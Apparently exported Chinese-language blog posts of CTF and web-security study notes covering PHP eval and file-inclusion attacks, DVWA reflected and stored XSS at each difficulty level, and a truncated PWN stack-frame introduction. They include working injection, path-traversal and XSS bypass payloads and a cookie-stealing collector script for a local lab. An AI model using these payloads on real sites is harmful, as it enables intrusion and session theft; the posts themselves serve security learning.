闭合漏洞</h2><p><code>eval()</code> 函数可以执行函数内部字符串所构成的指令。通过闭合前后的括号可以达到执行其他命令的效果。</p><h3 id="应用（lianxi-excute）"><a href="#应用（lianxi-excute）" class="headerlink" title="应用（lianxi-excute）"></a>应用（lianxi-excute）</h3><p>源码：</p><pre><code class="php"> &lt;?php    include &quot;flag.php&quot;;    $a = @$_REQUEST[&#39;hello&#39;];    eval( &quot;var_dump($a);&quot;);    show_source(__FILE__);?&gt;</code></pre><p>构造 payload：<code>);print_r(file(&quot;./flag.php&quot;)</code>，即 <code>eval(&quot;var_dump();print_r(file(&quot;./flag.php&quot;));&quot;);</code>。</p><p><img src="/pics/WEB集训/五/9.png" srcset="/img/loading.gif" alt></p><h2 id="应用六"><a href="#应用六" class="headerlink" title="应用六"></a>应用六</h2><p>源码：</p><pre><code class="php"> &lt;?php    show_source(__FILE__);    if(isset($_REQUEST[&#39;path&#39;])){        include($_REQUEST[&#39;path&#39;]);    }else{        include(&#39;phpinfo.php&#39;);    }?&gt;</code></pre><p>先通过伪协议扫描当前目录：<code>&lt;?php print_r(scandir(&quot;.&quot;)); ?&gt;</code></p><p><img src="/pics/WEB集训/五/10.png" srcset="/img/loading.gif" alt></p><p>直接访问 <code>flag.php</code> 得到 flag。</p><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><code>phar://</code></h2><p><code>phar://</code> 是数据流包装器，自 PHP5.3.0 起开始有效，也是 php 的一个函数，功能是解压还原。</p><h3 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h3><p>在 php 文件中写入 <code>&lt;?php phpinfo(); ?&gt;</code>，将文件压缩后修改后缀名为 <code>jpg</code>。</p><p>上传文件后构造 payload：<code>http://127.0.0.1/lianxi/phar1/include.php?file=phar://upload/11.jpg/11</code>。</p><h1 id="PHP-文件包含漏洞"><a href="#PHP-文件包含漏洞" class="headerlink" title="PHP 文件包含漏洞"></a>PHP 文件包含漏洞</h1><p>在通过<strong>函数包含文件</strong>时，由于没有对包含的文件名进行有效的<strong>过滤处理</strong>，被攻击者利用从而导致了包含了<strong>Web 根目录以外的文件</strong>进来，就会导致文件信息的的泄漏甚至注入了恶意代码</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>远程文件包含（RFI）：<code>?file=http://file/text.txt</code></li><li>本地文件包含（LFI）：<code>?file=../text.txt</code></li></ul><h2 id="PHP-文件包含的几个函数"><a href="#PHP-文件包含的几个函数" class="headerlink" title="PHP 文件包含的几个函数"></a>PHP 文件包含的几个函数</h2><ul><li><code>include()</code>：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。</li><li><code>include_once()</code>：和 <code>include()</code> 功能相同，区别在于当重复调用同一文件时，程序至调用一次。</li><li><code>require()</code>：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。</li><li><code>require_once()</code>：和 <code>require()</code> 功能相同，区别在于当重复调用同一文件时，程序只调用一次。</li></ul><h2 id="00截断（在-PHP5-3-4-之前有效）"><a href="#00截断（在-PHP5-3-4-之前有效）" class="headerlink" title="%00截断（在 PHP5.3.4 之前有效）"></a><code>%00</code>截断（在 PHP5.3.4 之前有效）</h2><p>在 <code>$_GET[&quot;filename&quot;]</code> 中常见</p><p>形式：<code>filename=test.php%00.txt</code></p><p>主要利用：<br>上传时路径必须为</p><ul><li>上传路径必须为 txt、png 等结尾时</li><li>文件下载时，绕过白名单检查</li><li>文件包含时，截断后面限制（主要是文件包含时）</li></ul><p>PS：PHP 配置中 <code>magic_quotes_gpc=Off</code>，即没有对数据进行转义解析。</p><h2 id="从根目录搜寻"><a href="#从根目录搜寻" class="headerlink" title="从根目录搜寻"></a>从根目录搜寻</h2><p><code>/../../../../../../www/dvwa/php.ini</code></p><p>前面必须加 <code>/</code>，表示从根目录开始。</p><h2 id="双写重构造"><a href="#双写重构造" class="headerlink" title="双写重构造"></a>双写重构造</h2><p><code>str_replace(array(&quot;../&quot;,&quot;..\&quot;),&quot;&quot;,$file);</code></p><p>payload：<code>?page=/..././..././www/dvwa/php.ini</code></p><h2 id="file-包含"><a href="#file-包含" class="headerlink" title="file 包含"></a>file 包含</h2><p><code>file://</code> 协议（本地包含文件）：将绝对路径下的文件包含进来。</p><p>漏洞利用：</p><ol><li>上传一个内容为<strong>php</strong>的文件</li><li>利用<strong>file</strong>协议取<strong>包含</strong>上传文件（需要知道上传文件的绝对路径）</li><li>实现<strong>任意命令执行</strong></li></ol><h1 id="PHP-相关函数整理"><a href="#PHP-相关函数整理" class="headerlink" title="PHP 相关函数整理"></a>PHP 相关函数整理</h1><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>extract()</code></td><td style="text-align:center">从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</td></tr><tr><td style="text-align:center"><code>isset()</code></td><td style="text-align:center">检测变量是否设置，并且不是 NULL。</td></tr><tr><td style="text-align:center"><code>trim()</code></td><td style="text-align:center">移除字符串两侧的空白字符或其他预定义字符。</td></tr><tr><td style="text-align:center"><code>file_get_contents()</code></td><td style="text-align:center">用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。</td></tr><tr><td style="text-align:center"><code>print_r()</code></td><td style="text-align:center">显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。</td></tr><tr><td style="text-align:center"><code>scandir()</code></td><td style="text-align:center">返回指定目录中的文件和目录的数组。</td></tr><tr><td style="text-align:center"><code>phpinfo()</code></td><td style="text-align:center">输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP 环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和 PHP 授权信息(License)。</td></tr><tr><td style="text-align:center"><code>eval()</code></td><td style="text-align:center">把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 <code>eval()</code> 函数返回 false。</td></tr><tr><td style="text-align:center"><code>var_dump()</code></td><td style="text-align:center">显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</td></tr><tr><td style="text-align:center"><code>include()</code></td><td style="text-align:center">获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。</td></tr><tr><td style="text-align:center"><code>show_source()</code></td><td style="text-align:center">对文件进行语法高亮显示。</td></tr></tbody></table><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://vinc.top/2016/09/28/%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://vinc.top/2016/09/28/%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br><a href="https://lightless.me/archives/include-file-from-zip-or-phar.html" target="_blank" rel="noopener">https://lightless.me/archives/include-file-from-zip-or-phar.html</a><br><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门（四）</title>
    <link href="/2018/07/08/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2018/07/08/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>涛哥带我学 XSS。</p><a id="more"></a><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>一种超文本标记语言。其结构包括头部分（Head）和主体部分（Body），其中头部提供关于网页的信息，主体部分提供网页的具体内容。由 HTML 各类标签组成。</p><p>各类标签：</p><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">img</td><td style="text-align:center">插入图片</td></tr><tr><td style="text-align:center">body</td><td style="text-align:center">文档的主体</td></tr><tr><td style="text-align:center">iframe</td><td style="text-align:center">在网页显示网页</td></tr></tbody></table><h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><p>一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在 HTML 网页上使用，用来给 HTML 网页增加动态功能。</p><h2 id="cookie-与-session"><a href="#cookie-与-session" class="headerlink" title="cookie 与 session"></a>cookie 与 session</h2><p>会话（Session）跟踪是 Web 程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是 Cookie 与 Session。Cookie 通过在客户端记录信息确定用户身份，Session 通过在服务器端记录信息确定用户身份。</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>Web 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。国际上公认的一种说法是：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</p><h1 id="Javascript-弹框操作"><a href="#Javascript-弹框操作" class="headerlink" title="Javascript 弹框操作"></a>Javascript 弹框操作</h1><p>Javascript 函数内嵌实现形式：<code>&lt;script&gt;Javascript的函数&lt;/script&gt;</code></p><p>相关函数：</p><ul><li><code>alert()</code>：用于提示</li><li><code>confirm()</code>：用于和用户交互确认</li><li><code>prompt()</code>：弹框让用户输入信息</li></ul><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>跨站脚本攻击（cross site script execution），一种出现在 web 应用程序中的计算机安全漏洞。由于 web 应用对用户的输入过滤不严而产生。恶意攻击者通过 HTML 注入篡改网页，插入恶意脚本，从而控制用户浏览器行为的一种攻击方式。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>网络钓鱼，包括盗取各类的用户账号</li><li>窃取用户 cookie</li><li>强制弹出广告页面，刷流量</li><li>页面挂马</li><li>提升用户权限，进一步渗透网站</li><li>传播扩展脚本蠕虫</li></ul><p>相比于 SQL 注入，SQL 注入是对后端的恶意篡改，而 XSS 是对前端的恶意攻击。</p><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h2><p>也称为非持久性、参数型跨站脚本。主要用于将恶意的脚本附加到 URL 地址的参数中。</p><p>一般使用的已经构造好的恶意 URL 发送给受害者，诱使受害者点击触发，只执行一次。</p><p><img src="/pics/WEB集训/四/1.png" srcset="/img/loading.gif" alt></p><h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h2><p>比反射型跨站脚本更具威胁，并且可能影响到 web 服务器的自身安全。</p><p>攻击者事先将恶意 JavaScript 代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</p><p><img src="/pics/WEB集训/四/2.png" srcset="/img/loading.gif" alt></p><h1 id="绕过-XSS-限制"><a href="#绕过-XSS-限制" class="headerlink" title="绕过 XSS 限制"></a>绕过 XSS 限制</h1><ul><li>绕过 <code>magic_quotes_gpc</code>（通过 <code>String.fromCharCode()</code> 函数）</li><li>HEX 编码</li><li>改变大小写</li><li>关闭标签（<code>&gt;&lt;script&gt;slert(&#39;xss&#39;);&lt;/script&gt;</code>）（闭合前面的标签）</li></ul><h1 id="相关-PHP-函数"><a href="#相关-PHP-函数" class="headerlink" title="相关 PHP 函数"></a>相关 PHP 函数</h1><ul><li><code>str_replace()</code>：以其他字符替换字符串中的一些字符（区分大小写）</li><li><code>addslashes()</code>：在预定义字符（<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、NULL）之前添加反斜杠</li><li><code>stripslashes()</code>：删除由 <code>addslashes()</code> 函数添加的反斜杠</li><li><code>trim()</code>：移除字符串两侧的空白字符或其他预定义字符</li><li><code>htmlspecialchars()</code>：把预定义的字符转换为 HTML 实体（<code>&amp;</code>（和号）成为<code>&amp;</code>；<code>&quot;</code>（双引号）成为<code>&quot;</code>；<code>&#39;</code>（单引号）成为 ‘；<code>&lt;</code>（小于）成为<code>&lt;</code>；<code>&gt;</code>（大于）成为<code>&gt;</code>）</li><li><code>htmlspecialchars_decode()</code>：把预定义的 HTML 实体转换为字符</li><li><code>mysql_real_escape_string()</code>：对字符串中的特殊符号（<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>）进行转义</li><li><code>strip_tags()</code>：剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签</li></ul><h1 id="DVWA-之-XSS"><a href="#DVWA-之-XSS" class="headerlink" title="DVWA 之 XSS"></a>DVWA 之 XSS</h1><p>今天在这里遇到了两个坑记录一下。</p><p>发现 Metasploitable 中的 DVWA 版本有点新，High Level 竟然就是 Impossible Level。最后还是用了以前 PHPSTUDY 里的旧版本来实验。</p><p>还有就是重置数据库的时候出现了无法删除 dvwa 数据库的错误。在命令行和图形界面都删除不了，最后直接去 mysql 目录下删除，才可以重置。</p><p><img src="/pics/WEB集训/四/3.png" srcset="/img/loading.gif" alt></p><p>实验中主要根据源码分析被过滤的部分，寻找绕过的方法。</p><h2 id="XSS-Reflected（反射型-XSS）"><a href="#XSS-Reflected（反射型-XSS）" class="headerlink" title="XSS Reflected（反射型 XSS）"></a>XSS Reflected（反射型 XSS）</h2><p>反射型相对简单一些。</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>源码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Feedback for end user    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;}?&gt;</code></pre><p>这里显然对输入内容没有任何过滤。直接输入 <code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code> 就有弹窗回显。</p><p><img src="/pics/WEB集训/四/4.png" srcset="/img/loading.gif" alt></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>这里通过 <code>str_replace</code> 函数，将字符串 <code>&lt;script&gt;</code> 替换成空串，故只要双写或是大小写混用即可绕过。</p><p>构造 <code>&lt;SCript&gt;alert(&#39;1&#39;)&lt;/script&gt;</code> 或者 <code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;1&#39;)&lt;/script&gt;</code>。</p><p><img src="/pics/WEB集训/四/5.png" srcset="/img/loading.gif" alt></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>源码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>源码中将所有的 <code>&lt;script&gt;</code> 完全过滤了（正则表达式中 <code>/i</code> 表示不区分大小写），使用 <code>&lt;script&gt;</code> 标签没有任何作用，所以需要通过其他方式。</p><p>在 HTML 的标签中，img、body、iframe 等标签的 src 注入恶意代码。payload 为：<code>&lt;img src=1 onerror=alert(&quot;1&quot;) /&gt;</code>（<code>onerror</code>事件会在文档或图像加载过程中发生错误时被触发。在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。）</p><p><img src="/pics/WEB集训/四/6.png" srcset="/img/loading.gif" alt></p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>源码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Check Anti-CSRF tokencheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>这里使用了 <code>htmlspecialchars()</code> 函数，将输入的恶意代码转换成 HTML 实体，完全过滤了恶意代码，无法进行攻击。</p><h2 id="XSS-Stored（存储型-XSS）"><a href="#XSS-Stored（存储型-XSS）" class="headerlink" title="XSS Stored（存储型 XSS）"></a>XSS Stored（存储型 XSS）</h2><p>存储型大多数存在留言板中，留言板又一般存在几个文本输入框。每个输入框都可以测试一下是否存在 XSS。</p><p>每次成功弹窗后，恶意代码都会被存储到数据库中，所以每次进入该页面都会出现之前的弹窗。</p><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p>源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>源码中对 name 和 message 处的信息没有做任何过滤，故可以直接尝试 xss。</p><p>在 message 一栏直接输入 <code>&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;</code> 就可以出发弹窗。在 name 一栏中有字数长度限制，故用 burpsuite 抓包之后，再修改 name 栏中的字符串为 <code>&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;</code>，放包后触发弹窗。</p><p><img src="/pics/WEB集训/四/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/四/8.png" srcset="/img/loading.gif" alt></p><h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p>源码：</p><pre><code class="php"> &lt;?phpif(isset($_POST[&#39;btnSign&#39;])){   $message = trim($_POST[&#39;mtxMessage&#39;]);   $name    = trim($_POST[&#39;txtName&#39;]);   // Sanitize message input   $message = trim(strip_tags(addslashes($message)));   $message = mysql_real_escape_string($message);   $message = htmlspecialchars($message);   // Sanitize name input   $name = str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $name);   $name = mysql_real_escape_string($name);   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&#39;$message&#39;,&#39;$name&#39;);&quot;;   $result = mysql_query($query) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );}?&gt;</code></pre><p>这里和前一题一样，通过 <code>str_replace</code> 函数，将字符串 <code>&lt;script&gt;</code> 替换成空串。</p><p>name 处可以继续通过抓包来进行 XSS。而 message 处输入的内容被 <code>htmlspecialchars()</code> 函数过滤，不存在 XSS。</p><p><img src="/pics/WEB集训/四/9.png" srcset="/img/loading.gif" alt></p><h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p>源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>在 name 处和上一题的 high level 处是一样的漏洞。故虽然过滤了 <code>&lt;script&gt;</code>，我们还是可以通过 HTML 的标签触发事件，引起弹窗。</p><p><img src="/pics/WEB集训/四/10.png" srcset="/img/loading.gif" alt></p><h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><p>源码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Check Anti-CSRF tokencheckToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>将 name 和 message 处输入的数据都经过 <code>htmlspecialchars()</code> 函数的处理，完全被过滤。</p><h1 id="XSS-盗取-cookie"><a href="#XSS-盗取-cookie" class="headerlink" title="XSS 盗取 cookie"></a>XSS 盗取 cookie</h1><p>攻击原理：通过 XSS 漏洞，利用一些 js 函数来获取用户信息。</p><p><img src="/pics/WEB集训/四/11.png" srcset="/img/loading.gif" alt></p><p>先在网站根目录下放入如下 php 文件：</p><pre><code class="php">&lt;?php    $cookie = $_GET[&#39;cookie&#39;];    file_put_contents(&#39;cookie.txt&#39;, $cookie)?&gt;</code></pre><p>PHP 文件中的<code>&#39;</code>很容易和中文的单引号<code>‘</code>搞混。</p><p>以下为 XSS 的 payload：</p><pre><code class="js">&lt;script&gt;document.location=&quot;http://127.0.0.1/dvwa/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></pre><p>输入 payload 后，在网站根目录下 <code>cookie.txt</code> 中存入了 cookie 的值。</p><p><img src="/pics/WEB集训/四/12.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/四/13.png" srcset="/img/loading.gif" alt></p><h1 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h1><p>The Browser Exploitation Framework，一个著名的 XSS 利用框架，是一个交互界面友好、高度集成、开源的一个项目。BeEF 可以和 MSF 结合起来一起使用。</p><p>PS：MSF 是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</p><p>如何用 BeEF 进行客户端劫持：</p><ol><li>在 Kali 下打开 BeEF</li><li>得到管理界面的 URL 和攻击 URL</li><li>利用 XSS 漏洞来访问攻击的 URL</li></ol><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/123779.html</a><br><a href="https://www.cnblogs.com/andy-zhou/p/5360107.html" target="_blank" rel="noopener">https://www.cnblogs.com/andy-zhou/p/5360107.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN入门（二）</title>
    <link href="/2018/07/07/PWN%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2018/07/07/PWN%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>初涉 PWN。</p><a id="more"></a><h1 id="关于-PWN-底层的原理"><a href="#关于-PWN-底层的原理" class="headerlink" title="关于 PWN 底层的原理"></a>关于 PWN 底层的原理</h1><h2 id="栈帧平衡"><a href="#栈帧平衡" class="headerlink" title="栈帧平衡"></a>栈帧平衡</h2><p>一些基本内容：</p><ul><li>ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶</li><li>EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部</li><li>函数栈帧：ESP 和 EBP 之间内存空间为当前栈帧</li></ul><p>在函数栈帧中一般包含以下几种信息：</p><ul><li>局部变量：为函数举报变量开辟的内存空间</li><li>栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡得到）</li><li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置</li></ul><p>如何保证栈帧平衡：</p><pre><code class="asm">PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧XXXXXX // 函数中间部分MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧</code></pre><p><img src="/pics/BIN集训/PWN/二/1.jpg" srcset="/img/loading.gif" alt></p><p>函数返回的步骤：</p><ol><li>保存返回值，通常将函数的返回值保存在寄存器 EAX 中。</li><li>弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给 EIP 